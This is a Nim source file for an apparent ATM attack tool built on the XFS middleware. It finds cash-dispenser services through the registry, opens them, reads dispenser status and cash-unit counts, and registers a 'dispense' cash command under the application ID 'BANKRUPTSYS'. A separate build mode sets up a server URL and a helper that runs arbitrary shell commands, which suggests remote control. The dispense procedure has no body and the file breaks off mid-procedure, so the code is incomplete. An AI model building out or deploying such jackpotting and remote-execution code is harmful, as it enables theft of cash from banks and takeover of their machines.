import strutils, tables, os, dynlib, streams, osproc, sequtils, json

when not defined(xfs):
  import asyncdispatch, times, httpclient, threadpool, random

when defined(windows):
  import winim/lean as winlean, winim/com
  const RRF_RT_REG_SZ = 0x00000002

const
  WFS_SUCCESS* = 0
  WFSC_BAD_CMD* = -1000
  WFS_INDEFINITE_WAIT* = 0
  APPID* = "BANKRUPTSYS"
  HKEY_LOGICAL_SERVICES* = ".DEFAULT\\XFS\\LOGICAL_SERVICES"
  WFS_CDM_TELLERBILL* = 0x0001
  WFS_CDM_SELFSERVICEBILL* = 0x0002
  WFS_CDM_TELLERCOIN* = 0x0003
  WFS_CDM_SELFSERVICECOIN* = 0x0004
  WFS_CDM_POSNULL* = 0x0000
  WFS_CDM_POSLEFT* = 0x0001
  WFS_CDM_POSRIGHT* = 0x0002
  WFS_CDM_POSFRONT* = 0x0004
  WFS_CDM_POSREAR* = 0x0008
  WFS_CDM_POSTOP* = 0x0010
  WFS_CDM_POSBOTTOM* = 0x0020
  WFS_CDM_POSCENTER* = 0x0040
  WFS_CMD_CDM_DISPENSE* = 0x0301
  WFS_INF_CDM_CAPABILITIES* = 0x0301
  WFS_INF_CDM_MIX_TYPES* = 0x0302
  WFS_INF_CDM_STATUS* = 0x0303
  WFS_INF_CDM_CASH_UNIT_INFO* = 0x0304
  WFS_ERR_ALREADY_STARTED* = -1
  WFS_ERR_API_VER_TOO_HIGH* = -2
  WFS_ERR_API_VER_TOO_LOW* = -3
  WFS_ERR_CANCELED* = -4
  WFS_ERR_DEV_NOT_READY* = -13
  WFS_ERR_INTERNAL_ERROR* = -15
  WFS_ERR_INVALID_LOGICAL_NAME* = -43
  WFS_ERR_INVALID_HSERVICE* = -22
  WFS_ERR_OUT_OF_MEMORY* = -42
  WFS_ERR_CDM_INVALIDCURRENCY* = -301
  WFS_ERR_CDM_INVALIDTELLERID* = -302
  WFS_ERR_CDM_CASHUNITERROR* = -303
  WFS_ERR_CDM_INVALIDDENOMINATION* = -304
  WFS_ERR_CDM_INVALIDMIXNUMBER* = -305
  WFS_ERR_CDM_NOCURRENCYMIX* = -306
  WFS_ERR_CDM_NOTDISPENSABLE* = -307
  WFS_ERR_CDM_TOOMANYITEMS* = -308
  WFS_EXEE_CDM_CASHUNITERROR* = -309

type
  HSERVICE* = uint16
  HRESULT* = int32
  REQUESTID* = uint32
  HAPP* = pointer
  LPHAPP* = ptr HAPP
  LPVOID* = pointer
  LPWFSRESULT* = ptr WFSRESULT
  WFSVERSION* = object
    wVersion*: uint16
    wLowVersion*: uint16
    wHighVersion*: uint16
    szDescription*: array[256, char]
    szSystemStatus*: array[256, char]
  LPWFSVERSION* = ptr WFSVERSION
  WFSCDMCAPS* = object
    wClass*: uint16
    fwType*: uint16
    wMaxDispenseItems*: uint16
    bCompound*: bool
    bShutter*: bool
    bShutterControl*: bool
    bSafeDoor*: bool
    bCashBox*: bool
    bIntermediateStacker*: bool
    bItemsTakenSensor*: bool
    fwPositions*: uint16
    fwExchangeType*: uint16
    bPowerSaveControl*: bool
    bPrepareDispense*: bool
    lpszExtra*: cstring
  LPWFSCDMCAPS* = ptr WFSCDMCAPS
  WFSCDMMIXTYPE* = object
    usMixNumber*: uint16
    usMixType*: uint16
    usSubType*: uint16
    lpszName*: cstring
  LPWFSCDMMIXTYPE* = ptr WFSCDMMIXTYPE
  WFSCDMSTATUS* = object
    fwDevice*: uint16
    fwSafeDoor*: uint16
    fwDispenser*: uint16
    fwIntermediateStacker*: uint16
    wDevicePosition*: uint16
    lppPositions*: ptr ptr WFSCDMOUTPOS
  LPWFSCDMSTATUS* = ptr WFSCDMSTATUS
  WFSCDMOUTPOS* = object
    fwPosition*: uint16
    fwShutter*: uint16
    fwPositionStatus*: uint16
    fwTransport*: uint16
    fwTransportStatus*: uint16
  LPWFSCDMOUTPOS* = ptr WFSCDMOUTPOS
  WFSCDMCASHUNIT* = object
    usNumber*: uint16
    usType*: uint16
    cUnitID*: array[5, char]
    cCurrencyID*: array[3, char]
    ulValues*: uint32
    ulInitialCount*: uint32
    ulCount*: uint32
    ulMinimum*: uint32
    ulMaximum*: uint32
    bAppLock*: bool
    lpszCashUnitName*: cstring
  LPWFSCDMCASHUNIT* = ptr WFSCDMCASHUNIT
  WFSCDMCUINFO* = object
    usCount*: uint16
    lppList*: ptr ptr WFSCDMCASHUNIT
  LPWFSCDMCUINFO* = ptr WFSCDMCUINFO
  WFSCDMDENOMINATION* = object
    cCurrencyID*: array[3, char]
    ulAmount*: uint32
    usCount*: uint16
    lpulValues*: ptr uint32
    ulCashBox*: uint32
  LPWFSCDMDENOMINATION* = ptr WFSCDMDENOMINATION
  WFSCDMDISPENSE* = object
    usTellerID*: uint16
    usMixNumber*: uint16
    fwPosition*: uint16
    bPresent*: bool
    lpDenomination*: LPWFSCDMDENOMINATION
  LPWFSCDMDISPENSE* = ptr WFSCDMDISPENSE
  WFSRESULT* = object
    RequestID*: REQUESTID
    hService*: HSERVICE
    tsTimestamp*: SYSTEMTIME
    hResult*: HRESULT
    lpBuffer*: LPVOID
  XFSBLOCKINGHOOK* = proc(): bool {.stdcall.}
  LPXFSBLOCKINGHOOK* = ptr XFSBLOCKINGHOOK
  Service* = ref object
    name*: string
    handle*: HSERVICE
    svcClass*: string
  Command* = ref object
    name*: string
    help*: string
    fn*: proc(argc: int, argv: seq[string], output: Stream): HRESULT

var
  services* = initTable[HSERVICE, Service]()
  classCommands* = initTable[string, seq[Command]]()
  globalCommands*: seq[Command]
  xfsLib: LibHandle

when not defined(xfs):
  const
    xfsCliExecutable* = "xfs.exe"

var
  pWFSStartUp: proc(dwVersionsRequired: uint32, lpWFSVersion: LPWFSVERSION): HRESULT {.stdcall.}
  pWFSCleanUp: proc(): HRESULT {.stdcall.}
  pWFSOpen: proc(lpszLogicalName: cstring, hApp: HAPP, lpszAppID: cstring, dwTraceLevel: uint32, dwTimeOut: uint32, dwSrvcVersionsRequired: uint32, lpSrvcVersion: LPWFSVERSION, lpSPIVersion: LPWFSVERSION, lphService: ptr HSERVICE): HRESULT {.stdcall.}
  pWFSClose: proc(hService: HSERVICE): HRESULT {.stdcall.}
  pWFSExecute: proc(hService: HSERVICE, dwCommand: uint32, lpCmdData: LPVOID, dwTimeOut: uint32, lppResult: ptr LPWFSRESULT): HRESULT {.stdcall.}
  pWFSGetInfo: proc(hService: HSERVICE, dwCategory: uint32, lpQueryDetails: LPVOID, dwTimeOut: uint32, lppResult: ptr LPWFSRESULT): HRESULT {.stdcall.}
  pWFSFreeResult: proc(lpResult: LPWFSRESULT): HRESULT {.stdcall.}
  pWFSLock: proc(hService: HSERVICE, dwTimeOut: uint32, lppResult: ptr LPWFSRESULT): HRESULT {.stdcall.}
  pWFSUnlock: proc(hService: HSERVICE): HRESULT {.stdcall.}

proc is64bitProcess*(): bool =
  var isWow64: BOOL
  let pIsWow64Process = cast[proc(h: HANDLE, b: ptr BOOL): BOOL {.stdcall.}](symAddr(cast[LibHandle](GetModuleHandle("kernel32")), "IsWow64Process"))
  if pIsWow64Process.isNil:
    # This function doesn't exist on 32-bit Windows, so we must be a 32-bit process.
    return false

  if pIsWow64Process(GetCurrentProcess(), addr isWow64) != 0:
    return isWow64 == FALSE
  
  return false

proc checkArchMismatch() =
  const
    IMAGE_FILE_MACHINE_I386 = 0x014c
    IMAGE_FILE_MACHINE_AMD64 = 0x8664

  let dllPath = "msxfs.dll"
  let hFile = CreateFile(dllPath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nil)
  if hFile == INVALID_HANDLE_VALUE: return

  defer: CloseHandle(hFile)

  var dosHeader: IMAGE_DOS_HEADER
  var bytesRead: DWORD
  if ReadFile(hFile, addr dosHeader, sizeof(dosHeader).DWORD, addr bytesRead, nil) == 0 or bytesRead != sizeof(dosHeader).DWORD:
    return

  if SetFilePointer(hFile, dosHeader.e_lfanew, nil, FILE_BEGIN) == INVALID_SET_FILE_POINTER:
    return

  var ntHeaders: IMAGE_NT_HEADERS32
  if not ReadFile(hFile, addr ntHeaders, sizeof(ntHeaders).DWORD, addr bytesRead, nil):
    return

  let dllIs64bit = ntHeaders.FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64

  let processIs64bit = is64bitProcess()
  if processIs64bit != dllIs64bit:
    let procArch = if processIs64bit: "64-bit" else: "32-bit"
    let dllArch = if dllIs64bit: "64-bit" else: "32-bit"
    echo "[!] Architecture Mismatch: Your application is ", procArch, " but msxfs.dll is ", dllArch, "."
    echo "    Please recompile your application to match the DLL architecture."
    quit(1)

proc init*() =
  checkArchMismatch()
  xfsLib = loadLib("msxfs.dll")
  if xfsLib.isNil:
    return
  pWFSStartUp = cast[proc(dwVersionsRequired: uint32, lpWFSVersion: LPWFSVERSION): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSStartUp"))
  pWFSCleanUp = cast[proc(): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSCleanUp"))
  pWFSOpen = cast[proc(lpszLogicalName: cstring, hApp: HAPP, lpszAppID: cstring, dwTraceLevel: uint32, dwTimeOut: uint32, dwSrvcVersionsRequired: uint32, lpSrvcVersion: LPWFSVERSION, lpSPIVersion: LPWFSVERSION, lphService: ptr HSERVICE): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSOpen"))

  pWFSClose = cast[proc(hService: HSERVICE): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSClose"))
  pWFSExecute = cast[proc(hService: HSERVICE, dwCommand: uint32, lpCmdData: LPVOID, dwTimeOut: uint32, lppResult: ptr LPWFSRESULT): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSExecute"))
  pWFSGetInfo = cast[proc(hService: HSERVICE, dwCategory: uint32, lpQueryDetails: LPVOID, dwTimeOut: uint32, lppResult: ptr LPWFSRESULT): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSGetInfo"))
  pWFSFreeResult = cast[proc(lpResult: LPWFSRESULT): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSFreeResult"))
  pWFSLock = cast[proc(hService: HSERVICE, dwTimeOut: uint32, lppResult: ptr LPWFSRESULT): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSLock"))
  pWFSUnlock = cast[proc(hService: HSERVICE): HRESULT {.stdcall.}](symAddr(xfsLib, "WFSUnlock"))

proc cdmtype2str*(typ: uint16): string =
  case typ
  of WFS_CDM_TELLERBILL: "Bills (Teller)"
  of WFS_CDM_SELFSERVICEBILL: "Bills (Self-Serve)"
  of WFS_CDM_TELLERCOIN: "Coins (Teller)"
  of WFS_CDM_SELFSERVICECOIN: "Coins (Self-Serve)"
  else: "Unknown"

proc pos2str*(pos: uint32): string =
  case pos
  of WFS_CDM_POSLEFT: "LEFT"
  of WFS_CDM_POSRIGHT: "RIGHT"
  of WFS_CDM_POSFRONT: "FRONT"
  of WFS_CDM_POSREAR: "REAR"
  of WFS_CDM_POSTOP: "TOP"
  of WFS_CDM_POSBOTTOM: "BOTTOM"
  of WFS_CDM_POSCENTER: "CENTER"
  else: "UNKNOWN"

proc check*(res: HRESULT, output: Stream) =
  if res == WFS_SUCCESS: return
  output.write "[!] Error ", res, ": "
  case res
  of WFS_ERR_ALREADY_STARTED: output.write "Already Started"
  of WFS_ERR_API_VER_TOO_HIGH: output.write "Version too high"
  of WFS_ERR_API_VER_TOO_LOW: output.write "Version too low"
  of WFS_ERR_CANCELED: output.write "Canceled"
  of WFS_ERR_DEV_NOT_READY: output.write "Device Not Ready"
  of WFS_ERR_INTERNAL_ERROR: output.write "Internal Error"
  of WFS_ERR_INVALID_LOGICAL_NAME: output.write "Invalid Logical Name"
  of WFS_ERR_INVALID_HSERVICE: output.write "Invalid service handle"
  of WFS_ERR_OUT_OF_MEMORY: output.write "Out of Memory"
  of WFS_ERR_CDM_INVALIDCURRENCY: output.write "Invalid Currency"
  of WFS_ERR_CDM_INVALIDTELLERID: output.write "Invalid Teller ID"
  of WFS_ERR_CDM_CASHUNITERROR: output.write "Cash Unit Error"
  of WFS_ERR_CDM_INVALIDDENOMINATION, WFS_EXEE_CDM_CASHUNITERROR: output.write "Invalid Denomination"
  of WFS_ERR_CDM_INVALIDMIXNUMBER: output.write "Invalid Mix Number"
  of WFS_ERR_CDM_NOCURRENCYMIX: output.write "No Currency Mix"
  of WFS_ERR_CDM_NOTDISPENSABLE: output.write "Not Dispensable"
  of WFS_ERR_CDM_TOOMANYITEMS: output.write "Too Many Items to Dispense"
  else: output.write "Unspecified Error"
  output.writeLine "."

proc isQuiet(argv: seq[string]): bool =
  return "--quiet" in argv

proc get_service*(id: HSERVICE): Service =
  if services.hasKey(id): return services[id]
  return nil

proc del_service*(svc: Service) =
  if svc.isNil: return
  discard pWFSClose(svc.handle)
  services.del(svc.handle)

proc lock*(svc: Service, output: Stream) =
  var res: LPWFSRESULT
  var hResult = pWFSLock(svc.handle, WFS_INDEFINITE_WAIT, addr res)
  check(hResult, output)
  if not res.isNil: discard pWFSFreeResult(res)

proc unlock*(svc: Service, output: Stream) =
  var hResult = pWFSUnlock(svc.handle)
  check(hResult, output)

proc cdm_dispense*(argc: int, argv: seq[string], output: Stream): HRESULT =

proc cdm_caps*(argc: int, argv: seq[string], output: Stream): HRESULT =
  if argc != 1: return WFSC_BAD_CMD
  let svc = get_service(parseInt(argv[0]).HSERVICE)
  if svc.isNil: return WFSC_BAD_CMD
  var res: LPWFSRESULT
  var hResult = pWFSGetInfo(svc.handle, WFS_INF_CDM_CAPABILITIES, nil, WFS_INDEFINITE_WAIT, addr res)
  check(hResult, output)
  output.writeLine "[+] Capabilities for ", svc.name
  if hResult == WFS_SUCCESS:
    let caps = cast[LPWFSCDMCAPS](res.lpBuffer)
    output.writeLine "    bCashBox: ", caps.bCashBox
    output.writeLine "    bCompound: ", caps.bCompound
    output.writeLine "    bIntermediateStacker: ", caps.bIntermediateStacker
    output.writeLine "    bItemsTakenSensor: ", caps.bItemsTakenSensor
    output.writeLine "    bPowerSaveControl: ", caps.bPowerSaveControl
    output.writeLine "    bPrepareDispense: ", caps.bPrepareDispense
    output.writeLine "    bSafedoor: ", caps.bSafeDoor
    output.writeLine "    bShutter: ", caps.bShutter
    output.writeLine "    bShutterControl: ", caps.bShutterControl
    output.writeLine "    fwExchangeType: ", caps.fwExchangeType
    output.writeLine "    fwType: ", cdmtype2str(caps.fwType)
    output.writeLine "    Max Dispense: ", caps.wMaxDispenseItems
    output.writeLine "    Extra: ", caps.lpszExtra
    let pos = caps.fwPositions
    output.writeLine "    Positions:"
    output.writeLine "    ----------"
    if (pos and WFS_CDM_POSLEFT) != 0: output.writeLine "      - LEFT"
    if (pos and WFS_CDM_POSRIGHT) != 0: output.writeLine "      - RIGHT"
    if (pos and WFS_CDM_POSTOP) != 0: output.writeLine "      - TOP"
    if (pos and WFS_CDM_POSBOTTOM) != 0: output.writeLine "      - BOTTOM"
    if (pos and WFS_CDM_POSFRONT) != 0: output.writeLine "      - FRONT"
    if (pos and WFS_CDM_POSREAR) != 0: output.writeLine "      - REAR"
    if (pos and WFS_CDM_POSCENTER) != 0: output.writeLine "      - CENTER"
  if not res.isNil: discard pWFSFreeResult(res)
  return WFS_SUCCESS

proc cdm_mixes*(argc: int, argv: seq[string], output: Stream): HRESULT =
  if argc != 1: return WFSC_BAD_CMD
  let svc = get_service(parseInt(argv[0]).HSERVICE)
  if svc.isNil: return WFSC_BAD_CMD
  var res: LPWFSRESULT
  var hResult = pWFSGetInfo(svc.handle, WFS_INF_CDM_MIX_TYPES, nil, WFS_INDEFINITE_WAIT, addr res)
  output.writeLine "[+] Mixing Algorithms for ", svc.name
  check(hResult, output)
  if not res.isNil:
    var mixes = cast[ptr UncheckedArray[LPWFSCDMMIXTYPE]](res.lpBuffer)
    var i = 0
    while not mixes[i].isNil:
      let mix = mixes[i]
      echo "    ", mix.usMixNumber, " - ", mix.usMixType, " - ", mix.lpszName
      inc i
    discard pWFSFreeResult(res)
  return WFS_SUCCESS

proc cdm_info*(argc: int, argv: seq[string], output: Stream): HRESULT =
  if argc != 1: return WFSC_BAD_CMD
  let svc = get_service(parseInt(argv[0]).HSERVICE)
  if svc.isNil: return WFSC_BAD_CMD
  var res: LPWFSRESULT
  var hResult = pWFSGetInfo(svc.handle, WFS_INF_CDM_STATUS, nil, WFS_INDEFINITE_WAIT, addr res)
  output.writeLine "[+] Dispenser Status for ", svc.name, ":"
  check(hResult, output)
  if not res.isNil:
    let s = cast[LPWFSCDMSTATUS](res.lpBuffer)
    output.writeLine "    Device:    ", s.fwDevice
    output.writeLine "    Dispenser: ", s.fwDispenser
    output.writeLine "    Stacker:   ", s.fwIntermediateStacker
    output.writeLine "    Safedoor:  ", s.fwSafeDoor
    output.writeLine "    Position:  ", s.wDevicePosition
    output.writeLine "    Output Positions:"
    output.writeLine "    -----------------"
    var positions = cast[ptr UncheckedArray[LPWFSCDMOUTPOS]](s.lppPositions)
    if not positions.isNil:
      var i = 0
      while not positions[i].isNil:
        let p = positions[i]
        output.writeLine "    ", i, " - ", pos2str(p.fwPosition), " (status=0x", toHex(p.fwPositionStatus), ") Shutter=0x", toHex(p.fwShutter), " Transport=0x", toHex(p.fwTransport), " (status=", p.fwTransportStatus, ")"
        inc i
    discard pWFSFreeResult(res)
  hResult = pWFSGetInfo(svc.handle, WFS_INF_CDM_CASH_UNIT_INFO, nil, WFS_INDEFINITE_WAIT, addr res)
  output.writeLine "[+] Cash Units for ", svc.name, ":"
  check(hResult, output)
  if not res.isNil:
    let info = cast[LPWFSCDMCUINFO](res.lpBuffer)
    let units = cast[ptr UncheckedArray[LPWFSCDMCASHUNIT]](info.lppList)
    output.writeLine "[*] Found ", info.usCount, " cash units (may not reflect physical units)"
    for i in 0..<info.usCount.int:
      let unit = units[i]
      let unitID = $cast[cstring](addr unit.cUnitID[0])
      let currency = $cast[cstring](addr unit.cCurrencyID[0])
      output.writeLine "    ", i, ": ", unitID, " - (", currency, ") - ", unit.lpszCashUnitName
      output.writeLine "    Type=", unit.usType, " Value=", unit.ulValues
      output.writeLine "    Min=", unit.ulMinimum, " Max=", unit.ulMaximum, " Cur=", unit.ulCount
      output.writeLine "    ", if unit.bAppLock: "LOCKED" else: "USABLE"
    discard pWFSFreeResult(res)
  return hResult

proc getAllServices*(): seq[string] =
  const
    KEY_READ = 0x20019'u32
    KEY_WOW64_64KEY = 0x0100'u32
    MAX_NAME_CHARS = 256

  var hKey: HKEY = nil
  var services: seq[string] = @[]

  let pathsToTry = [
    (HKEY_LOCAL_MACHINE, "SOFTWARE\\XFS\\LOGICAL_SERVICES", (KEY_READ or KEY_WOW64_64KEY).REGSAM),
    (HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\XFS\\LOGICAL_SERVICES", KEY_READ.REGSAM),
    (HKEY_USERS, HKEY_LOGICAL_SERVICES, KEY_READ.REGSAM)
  ]

  for (root, path, flags) in pathsToTry:
    if RegOpenKeyExW(root, newWideCString(path), 0.DWORD, flags, cast[PHKEY](addr hKey)) == ERROR_SUCCESS:
      var name: array[MAX_NAME_CHARS, WCHAR]
      var index = 0
      while true:
        var nameLen: DWORD = MAX_NAME_CHARS.DWORD
        let enumRes = RegEnumKeyExW(hKey, index.DWORD, addr name[0], addr nameLen, nil, nil, nil, nil)

        if enumRes == ERROR_NO_MORE_ITEMS:
          break
        elif enumRes != ERROR_SUCCESS:
          echo "[-] RegEnumKeyExW error: ", enumRes
          break

        name[nameLen.int] = 0.WCHAR
        services.add($cast[WideCString](addr name[0]))
        inc index

      discard RegCloseKey(hKey)
      if services.len > 0:
        return services

  return services

proc checkProvider(logicalName: string): bool =
  let baseKey = if is64bitProcess():
                  r"SOFTWARE\XFS\LOGICAL_SERVICES"
                else:
                  r"SOFTWARE\WOW6432Node\XFS\LOGICAL_SERVICES"

  let fullPath = baseKey & "\\" & logicalName
  var hKey: HKEY = nil
  let accessFlags = if is64bitProcess(): KEY_READ.REGSAM or KEY_WOW64_64KEY.REGSAM else: KEY_READ.REGSAM
  let res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, newWideCString(fullPath), 0, accessFlags, addr hKey)
  if res != ERROR_SUCCESS:
    echo "[-] Logical service not found in hive: ", fullPath
    return false

  var providerBuf: array[256, WCHAR]
  var bufSize = DWORD(sizeof(providerBuf))
  if RegQueryValueEx(hKey, "provider", nil, nil, cast[LPBYTE](addr providerBuf), addr bufSize) == ERROR_SUCCESS:
    let provider = $cast[WideCString](addr providerBuf[0])
    echo "[*] Logical Service: ", logicalName
    echo "    Provider: ", provider

    let providerBase = if is64bitProcess(): r"SOFTWARE\XFS\SERVICE_PROVIDERS\"
                       else: r"SOFTWARE\WOW6432Node\XFS\SERVICE_PROVIDERS\"

    let provPath = newWideCString(providerBase & provider)
    var hProv: HKEY
    if RegOpenKeyEx(HKEY_LOCAL_MACHINE, provPath, 0, accessFlags, addr hProv) == ERROR_SUCCESS:
      var dllBuf: array[MAX_PATH, WCHAR]
      var dllSize = DWORD(sizeof(dllBuf))
      if RegQueryValueEx(hProv, "dllname", nil, nil, cast[LPBYTE](addr dllBuf), addr dllSize) == ERROR_SUCCESS:
        let dllname = $cast[WideCString](addr dllBuf[0])
        echo "    DLL: ", dllname
      RegCloseKey(hProv)
    else:
      echo "[-] Provider key not found: ", provPath
  else:
    echo "[-] No provider value under ", fullPath

  RegCloseKey(hKey)
  return true

proc getClassForService*(serviceName: string, output: Stream): string =
  var hKey: HKEY
  let keyPath = if is64bitProcess():
                  r"SOFTWARE\XFS\LOGICAL_SERVICES"
                else:
                  r"SOFTWARE\WOW6432Node\XFS\LOGICAL_SERVICES"

  if RegOpenKeyExW(HKEY_LOCAL_MACHINE, newWideCString(keyPath), 0.DWORD, (KEY_READ.REGSAM or KEY_WOW64_64KEY.REGSAM), cast[PHKEY](addr hKey)) != ERROR_SUCCESS:
    return ""

  var classBuf: array[256, WCHAR]
  var classLenBytes: DWORD = (256 * sizeof(WCHAR)).DWORD
  let getRes = RegGetValueW(hKey,
                            newWideCString(serviceName),
                            newWideCString("class"),
                            RRF_RT_REG_SZ,
                            nil,
                            cast[PVOID](addr classBuf[0]),
                            addr classLenBytes)
  RegCloseKey(hKey)

  if getRes == ERROR_SUCCESS:
    return $cast[WideCString](addr classBuf[0])
  return ""

proc open_svc*(argc: int, argv: seq[string], output: Stream): HRESULT =
  if argc != 1: return WFSC_BAD_CMD
  let serviceArg = argv[0]

  let availableServices = getAllServices()
  var serviceName: string
  for s in availableServices:
    if cmpIgnoreCase(s, serviceArg) == 0:
      serviceName = s 
      break

  if serviceName.isNil:
    output.writeLine "[-] Service '", serviceArg, "' not found. Try running 'scan'."
    return WFSC_BAD_CMD

  var svcver, spiver: WFSVERSION
  var svc: HSERVICE
  if not isQuiet(argv): output.writeLine "[+] Opening Service: ", serviceName
  let hResult = pWFSOpen(serviceName, nil, APPID, 0, 10000, 3, addr svcver, addr spiver, addr svc)
  check(hResult, output)
  if hResult == WFS_SUCCESS:
    let svcClass = getClassForService(serviceName, output)
    services[svc] = Service(name: serviceName, handle: svc, svcClass: svcClass)
    if not isQuiet(argv): output.writeLine "[+] ", serviceName, " (", svcClass, ") assigned to handle ", svc
  return WFS_SUCCESS

proc close_svc*(argc: int, argv: seq[string], output: Stream): HRESULT =
  if argc != 1: return WFSC_BAD_CMD
  let id = parseInt(argv[0]).uint16
  let svc = get_service(id)
  if svc.isNil:
    output.writeLine "[-] Service handle ", id, " is not open."
    return WFS_SUCCESS
  let serviceName = svc.name
  del_service(svc)
  output.writeLine "[+] Service '", serviceName, "' (handle ", id, ") has been closed."
  return WFS_SUCCESS

proc do_quit*(argc: int, argv: seq[string], output: Stream): HRESULT =
  output.writeLine "[+] Exiting..."
  for id, svc in services:
    output.writeLine "    Closing ", svc.name
    discard pWFSClose(svc.handle)
  services.clear()
  discard pWFSCleanUp()
  quit(0)

proc list_svc*(argc: int, argv: seq[string], output: Stream): HRESULT =
  for id, svc in services:
    output.writeLine id, " - ", svc.name
  return WFS_SUCCESS

proc scan_svc*(argc: int, argv: seq[string], output: Stream): HRESULT =
  const
    MAX_CLASS_CHARS = 256

  let services = getAllServices()
  if services.len == 0:
    output.writeLine "[-] No logical services found (checked several common locations)."
    output.writeLine "    Checked: HKLM\\SOFTWARE\\XFS\\LOGICAL_SERVICES (64-bit view)"
    output.writeLine "    Checked: HKLM\\SOFTWARE\\WOW6432Node\\XFS\\LOGICAL_SERVICES (32-bit view)"
    output.writeLine "    Checked: HKU\\.DEFAULT\\XFS\\LOGICAL_SERVICES"
    return WFS_SUCCESS

  var hKey: HKEY
  let keyPath = "SOFTWARE\\XFS\\LOGICAL_SERVICES"
  if RegOpenKeyExW(HKEY_LOCAL_MACHINE, newWideCString(keyPath), 0.DWORD, (KEY_READ.REGSAM or KEY_WOW64_64KEY.REGSAM), cast[PHKEY](addr hKey)) != ERROR_SUCCESS:
    echo "[-] Could not open registry to read service classes."
  
  for serviceName in services:
    var classBuf: array[MAX_CLASS_CHARS, WCHAR]
    var classLenBytes: DWORD = (MAX_CLASS_CHARS * sizeof(WCHAR)).DWORD
    let getRes = RegGetValueW(hKey,
                              newWideCString(serviceName),
                              newWideCString("class"),
                              RRF_RT_REG_SZ,
                              nil,
                              cast[PVOID](addr classBuf[0]),
                              addr classLenBytes)

    if getRes == ERROR_SUCCESS:
      let cls = $cast[WideCString](addr classBuf[0])
      output.writeLine cls, " - ", serviceName
    else:
      output.writeLine "(no class) - ", serviceName
  
  if hKey != nil: discard RegCloseKey(hKey)
  
  return WFS_SUCCESS

proc startup_info_svc*(argc: int, argv: seq[string], output: Stream): HRESULT =
  let serviceNames = getAllServices()
  var cdmServiceName: string
  for serviceName in serviceNames:
    if getClassForService(serviceName, output).toUpper == "CDM":
      cdmServiceName = serviceName
      break
  
  if cdmServiceName.isNil:
    return WFS_SUCCESS
  var openArgv = @[cdmServiceName]
  if open_svc(openArgv.len, openArgv, output) != WFS_SUCCESS:
    return WFSC_BAD_CMD

  if services.len > 0:
    let handle = services.keys.toSeq[0]
    let infoArgv = @[$handle]
    discard cdm_info(1, infoArgv, output)
  
  return WFS_SUCCESS

proc parse*(line: string): tuple[argc: int, argv: seq[string]] =
  let tokens = line.split(' ')
  var argv: seq[string] = @[]
  for tok in tokens:
    if tok.len > 0:
      argv.add(tok)
  return (argv.len, argv)

proc dispatch*(argc: int, argv: seq[string], output: Stream): HRESULT =
  if argc == 0: return WFS_SUCCESS

  for cmd in globalCommands:
    if argv[0] == cmd.name:
      if cmd.fn.isNil:
        output.writeLine "[!] Unimplemented!"
        return WFSC_BAD_CMD
      let res = cmd.fn(argc - 1, argv[1..^1], output)
      if res == WFSC_BAD_CMD: output.writeLine "[!] ", cmd.help
      return res

  if argc < 2:
    output.writeLine "[-] Command '", argv[0], "' requires a service handle."
    return WFSC_BAD_CMD

  let handle = parseInt(argv[1]).HSERVICE
  let svc = get_service(handle)
  if svc.isNil:
    output.writeLine "[-] Invalid or closed service handle: ", handle
    return WFSC_BAD_CMD

  if not classCommands.hasKey(svc.svcClass):
    output.writeLine "[-] No commands registered for service class '", svc.svcClass, "'."
    return WFSC_BAD_CMD

  for cmd in classCommands[svc.svcClass]:
    if argv[0] == cmd.name:
      var newArgv = @[argv[1]]
      if argc > 2: newArgv.add(argv[2..^1])
      let res = cmd.fn(newArgv.len, newArgv, output)
      if res == WFSC_BAD_CMD: output.writeLine "[!] ", cmd.help
      return res

  output.writeLine "[-] Unknown command '", argv[0], "' for service class '", svc.svcClass, "'."
  return WFSC_BAD_CMD

proc handle*(cmd: string, output: Stream) =
  let (argc, argv) = parse(cmd)
  if argc == 0: return
  type CmdFn = proc(argc: int, argv: seq[string], output: Stream): HRESULT
  globalCommands = @[
    Command(name: "open", help: "Establish a connection with a service provider.\nUsage: open <logical_name>", fn: open_svc),
    Command(name: "close", help: "Close an existing service connection.\nUsage: close <id>", fn: close_svc),
    Command(name: "list", help: "List active services.", fn: list_svc),
    Command(name: "scan", help: "Scans the computer for XFS services.", fn: scan_svc),
    Command(name: "quit", help: "Disconnect from the XFS manager.", fn: do_quit),
    Command(name: "exit", help: "See quit.", fn: do_quit)
  ]
  classCommands["CDM"] = @[
    Command(name: "info", help: "Queries information about the cash dispenser.\nUsage: info <id>", fn: cdm_info),
    Command(name: "caps", help: "Queries capabilities of the cash dispenser.\nUsage: caps <id>", fn: cdm_caps),
    Command(name: "mix", help: "Displays supported mixing algorithms\nUsage: mix <id>", fn: cdm_mixes),
    Command(name: "dispense", help: "Dispense cash\nUsage: dispense <id> <amount> [currency=USD] [mix=1]", fn: cdm_dispense)
  ]
  classCommands["PTR"] = @[]

  if argv[0] == "startup_info":
    discard startup_info_svc(argc - 1, argv[1..^1], output)
    return
  discard dispatch(argc, argv, output)

const stateFile = ".xfs_state"

proc saveState() =
  var openServices: seq[string]
  for _, svc in services:
    openServices.add(svc.name)
  writeFile(stateFile, $ %openServices)

proc loadState(output: Stream) =
  if not fileExists(stateFile): return
  try:
    let serviceNames = parseFile(stateFile).to(seq[string])
    for name in serviceNames:
      discard open_svc(1, @[name, "--quiet"], output)
  except:
    discard

when not defined(xfs):
  const
    serverUrl* = "http://localhost:8080"

  var
    currentDir = getCurrentDir()
    sessionRegistry: seq[string] = @[]

  proc runBlockingCommand(cmd: string, pidHolder: ref int): string =
    var p = startProcess(cmd,
      options = {poEvalCommand, poUsePath, poStdErrToStdOut})
    pidHolder[] = p.processID
    var output = newStringOfCap(4096)
    while not p.outputStream.atEnd:
      output.add(p.outputStream.readStr(4096))
    discard p.waitForExit()
    p.close()
    return output

  proc runCommandWithTimeoutKill(cmd: string, timeoutMs: int): Future[string] {.async.} =
    var pidHolder = new(int)
